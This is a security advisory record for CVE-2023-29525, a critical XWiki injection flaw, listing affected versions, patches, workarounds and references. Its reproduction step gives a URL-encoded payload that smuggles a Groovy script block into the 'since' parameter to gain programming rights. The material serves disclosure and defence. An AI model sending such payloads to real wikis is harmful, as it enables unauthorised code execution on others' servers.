advisory_id: GHSA-jgg7-w2rj-58cj
datasource_id: github_osv_importer_v2/GHSA-jgg7-w2rj-58cj
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/04/GHSA-jgg7-w2rj-58cj/GHSA-jgg7-w2rj-58cj.json
aliases:
  - CVE-2023-29525
summary: |
  XWiki Platform vulnerable to privilege escalation from view right on XWiki.Notifications.Code.LegacyNotificationAdministration
  ### Impact

  Steps to reproduce:

  Open <xwiki-host>/xwiki/bin/view/XWiki/Notifications/Code/LegacyNotificationAdministration?since=%7B%7B%2Fhtml%7D%7D+%7B%7Basync+async%3D%22true%22+cached%3D%22false%22+context%3D%22doc.reference%22%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello+%22+%2B+%22from+groovy%21%22%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D, where <xwiki-host> is the URL of your XWiki installation.

  This demonstrates an XWiki syntax injection attack via the since-parameter, allowing privilege escalation from view to programming rights.

  ### Patches

  The vulnerability has been patched in XWiki 15.0-rc-1, 14.10.3, 14.4.8 and 14.10.3.

  ### Workarounds

  For versions >= 14.6-rc-1 the workaround is to modify the page `XWiki.Notifications.Code.LegacyNotificationAdministration` to add the missing escaping, as described on https://github.com/xwiki/xwiki-platform/commit/8e7c7f90f2ddaf067cb5b83b181af41513028754#diff-4e13f4ee4a42938bf1201b7ee71ca32edeacba22559daf0bcb89d534e0225949R70

  For versions < 14.6-rc-1 the workaround is to modify the file `<xwikiwebapp>/templates/distribution/eventmigration.wiki` to add the missing escaping, as described on https://github.com/xwiki/xwiki-platform/commit/6d74e2e4aa03d19f0be385ab63ae9e0f0e90a766

  ### References

  https://jira.xwiki.org/browse/XWIKI-20287

  ### For more information

  If you have any questions or comments about this advisory:
  * Open an issue in [Jira XWiki.org](https://jira.xwiki.org/)
  * Email us at [Security Mailing List](mailto:security@xwiki.org)
impacted_packages:
  - purl: pkg:maven/org.xwiki.platform/xwiki-platform-distribution-war
    affected_versions: vers:maven/>=12.6.1|<13.10.11
    fixed_versions: vers:maven/13.10.11
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:maven/org.xwiki.platform/xwiki-platform-distribution-war
    affected_versions: vers:maven/>=14.0-rc-1|<14.4.8
    fixed_versions: vers:maven/14.4.8
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:maven/org.xwiki.platform/xwiki-platform-distribution-war
    affected_versions: vers:maven/>=14.5|<14.6-rc-1
    fixed_versions: vers:maven/14.6-rc-1
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:maven/org.xwiki.platform/xwiki-platform-legacy-events-hibernate-ui
    affected_versions: vers:maven/>=14.6-rc-1|<14.10.3
    fixed_versions: vers:maven/14.10.3
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '9.9'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/04/GHSA-jgg7-w2rj-58cj/GHSA-jgg7-w2rj-58cj.json
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-74
references:
  - url: https://github.com/xwiki/xwiki-platform
    reference_type:
    reference_id:
  - url: https://github.com/xwiki/xwiki-platform/commit/6d74e2e4aa03d19f0be385ab63ae9e0f0e90a766
    reference_type:
    reference_id:
  - url: https://github.com/xwiki/xwiki-platform/commit/8e7c7f90f2ddaf067cb5b83b181af41513028754#diff-4e13f4ee4a42938bf1201b7ee71ca32edeacba22559daf0bcb89d534e0225949R70
    reference_type:
    reference_id:
  - url: https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-jgg7-w2rj-58cj
    reference_type:
    reference_id:
  - url: https://jira.xwiki.org/browse/XWIKI-20287
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2023-29525
    reference_type:
    reference_id: CVE-2023-29525
